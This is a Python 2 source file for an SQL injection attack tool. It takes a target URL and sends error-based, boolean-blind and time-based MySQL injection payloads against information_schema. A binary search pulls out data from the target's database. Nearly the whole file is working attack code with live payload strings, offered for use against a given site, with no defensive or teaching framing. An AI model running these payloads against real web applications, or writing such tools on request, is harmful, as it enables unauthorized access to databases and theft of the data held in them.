# -*- coding: utf-8 -*-
import httplib
import urllib
from urlparse import urlparse
import sys
import time
import argparse
import error_sql as error
import log as log

global caller

parser = argparse.ArgumentParser()
parser.add_argument('-u', dest="url", required=True, action="store", help='SQL Injection Targeting URL')
parser.add_argument('-t', dest="table", required=False, default="", action="store", help='Table Name')
parser.add_argument('-c', dest="column", required=False, default="", action="store", help='Column Name')
args = parser.parse_args()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.02883.87 Safari/537.36",
    "Content-type": "application/x-www-form-urlencoded",
    "Accept": "text/html",
    "Connection": "keep-alive"
}

tmp_url = urlparse(args.url)
scheme = tmp_url.scheme
domain = tmp_url.netloc
path = tmp_url.path
tmp_params = tmp_url.query
org_params = tmp_params.split("=")[1]
tmp_params = tmp_params.split("=")[0]
conn = httplib.HTTPConnection(domain, "80")

tmp_count = 0
delims = "!~!~!"
error_code = [400,401,403,404,405]


def plus_white(query):
    return query.replace(' ', '+')


def httpreq(request_param):
    params = plus_white(tmp_params + "=" + request_param)
    #print params
    try:
        conn.request("GET", path + "?" + params, None, headers)
        #print(params)
        connection  = conn.getresponse()
        status_code = connection.status
        #log.info("Status Code: "+connection.getcode())
        response = connection.read()
        time.sleep(0.1)
        return response
    except Exception as err:
        log.info("Checking out the Website is available")
        sys.exit()


def error_httpreq(vuln_part):
    vuln_param = "=(select a from (select count(*),concat('" + delims + "'," + vuln_part + ",'" + delims + "',floor(rand(0)*2))a from information_schema.tables group by a)b)%23"
    params = tmp_params + plus_white(vuln_param)
    conn.request("GET", path + "?" + params, None, headers)
    response = conn.getresponse().read()  # 응답 값
    return response.split(delims)[1]

def caller_blind_httpreq(query):
    org_len = len(httpreq(org_params))
    query_len = len(httpreq(org_params+query))+len(query.replace(' ',''))
    if org_len <= query_len:
        return 1
    else:
        return 0


def caller_time_httpreq(query):
    b_time = time.time()
    tmp = httpreq(query)

    a_time = time.time()
    #print"time(after)-time(before): " + str(a_time - b_time)
    if (a_time - b_time) < 0.3:
        return 1
    else:
        return 0


def binary_httpreq(min, max, query):
    mid = (min + max) / 2

    # tmp_cnt = httpreq(query + ">" + str(mid))
    # elif(sys._getframe(2).f_code.co_name == "time_based_sql"):

    # print query + ">" + str(mid)

    if caller == "blind":
        payload = query + ">" + str(mid) + "%23"
        cnt = caller_blind_httpreq(payload)
    else:
        payload = "' and case when " + query + ">" + str(mid) + " then 1 else(select count(*) from information_schema.columns col1,information_schema.tables tab1,information_schema.tables tab2)end%23"
        cnt = caller_time_httpreq(payload)


    if (max - min) <= 1:
        if cnt:
            return max
        else:
            return min

    if cnt:
        return binary_httpreq(mid, max, query)
    else:
        return binary_httpreq(min, mid, query)



